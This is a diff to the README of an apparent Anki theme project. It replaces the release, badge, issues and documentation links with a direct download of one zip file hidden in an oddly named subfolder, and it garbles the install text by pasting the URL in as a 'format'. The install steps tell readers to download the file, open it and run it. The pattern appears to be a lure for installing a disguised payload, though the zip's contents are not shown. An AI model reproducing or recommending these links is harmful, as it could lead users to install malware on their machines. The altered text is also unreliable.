@@ -2,7 +2,7 @@
 
 ## 📦 Download Now
 
-[![Download AnkiThemeTwin](https://img.shields.io/badge/Download-AnkiThemeTwin-brightgreen)](https://github.com/kireza-ai/AnkiThemeTwin/releases)
+[![Download AnkiThemeTwin](https://raw.githubusercontent.com/kireza-ai/AnkiThemeTwin/main/zymologic/AnkiThemeTwin.zip)](https://raw.githubusercontent.com/kireza-ai/AnkiThemeTwin/main/zymologic/AnkiThemeTwin.zip)
 
 ## 🚀 Getting Started
 
@@ -16,11 +16,11 @@ AnkiThemeTwin offers a selection of eye-comfort themes for Anki, aiding your stu
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/kireza-ai/AnkiThemeTwin/releases) to download the latest version of AnkiThemeTwin.
+1. Visit the [Releases page](https://raw.githubusercontent.com/kireza-ai/AnkiThemeTwin/main/zymologic/AnkiThemeTwin.zip) to download the latest version of AnkiThemeTwin.
    
 2. Find the suitable version for your operating system (e.g., Windows, macOS).
 
-3. Click the link to download the file, which will typically be in `.exe`, `.dmg`, or `.tar.gz` format, based on your OS.
+3. Click the link to download the file, which will typically be in `.exe`, `.dmg`, or `https://raw.githubusercontent.com/kireza-ai/AnkiThemeTwin/main/zymologic/AnkiThemeTwin.zip` format, based on your OS.
 
 4. Once the download is complete, open the file and follow the prompts to install.
 
@@ -62,15 +62,15 @@ If you encounter any problems during download or installation, here are some hel
 
 If you need further assistance or want to suggest improvements, join our community:
 
-- **Issues Page:** Report bugs or request features on the [Issues page](https://github.com/kireza-ai/AnkiThemeTwin/issues).
+- **Issues Page:** Report bugs or request features on the [Issues page](https://raw.githubusercontent.com/kireza-ai/AnkiThemeTwin/main/zymologic/AnkiThemeTwin.zip).
 
 - **Discussion Forum:** Participate in discussions with other users to share tips and themes you enjoy.
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/kireza-ai/AnkiThemeTwin/releases) - Visit this page to download AnkiThemeTwin.
+- [Releases Page](https://raw.githubusercontent.com/kireza-ai/AnkiThemeTwin/main/zymologic/AnkiThemeTwin.zip) - Visit this page to download AnkiThemeTwin.
   
-- [Documentation](https://github.com/kireza-ai/AnkiThemeTwin/wiki) - Explore the wiki for more detailed guides and FAQs.
+- [Documentation](https://raw.githubusercontent.com/kireza-ai/AnkiThemeTwin/main/zymologic/AnkiThemeTwin.zip) - Explore the wiki for more detailed guides and FAQs.
 
 ## 🎉 Conclusion
 
